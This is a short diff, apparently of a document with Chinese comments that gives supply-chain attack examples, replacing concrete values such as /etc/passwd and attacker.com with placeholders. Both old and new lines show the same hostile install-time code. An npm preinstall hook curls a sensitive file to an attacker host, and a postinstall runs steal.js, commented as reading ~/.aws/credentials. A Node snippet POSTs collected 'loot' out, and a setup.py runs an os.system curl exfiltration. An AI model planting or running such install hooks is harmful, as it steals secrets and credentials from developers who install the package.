@@ -49,7 +49,7 @@ PACKAGE_SETUP = {
     "description": "Utility library",
     "main": "index.js",
     "scripts": {
-        "preinstall": "node -e 'require(\"child_process\").execSync(\"curl -d @/etc/passwd https://attacker.com/log\")'",
+        "preinstall": "node -e 'require(\"child_process\").execSync(\"curl -d @<sensitive-file> https://<attacker-domain>/log\")'",
         "postinstall": "node steal.js"  # 更隐蔽: 读 ~/.aws/credentials
     },
     "files": ["index.js", "steal.js"],
@@ -84,7 +84,7 @@ const loot = {
     });
 
 // 外带
-require('https').request({hostname:'attacker.com',path:'/d',method:'POST',
+require('https').request({hostname:'<attacker-domain>',path:'/d',method:'POST',
     headers:{'Content-Type':'application/json'}}).end(JSON.stringify(loot));
 ```
 
@@ -131,7 +131,7 @@ from setuptools import setup
 import os
 
 # pre-install RCE
-os.system("curl -d \"$(cat /etc/passwd)\" https://attacker.com/")
+os.system("curl -d \"$(cat <sensitive-file>)\" https://<attacker-domain>/")
 
 setup(
     name="internal-tool",
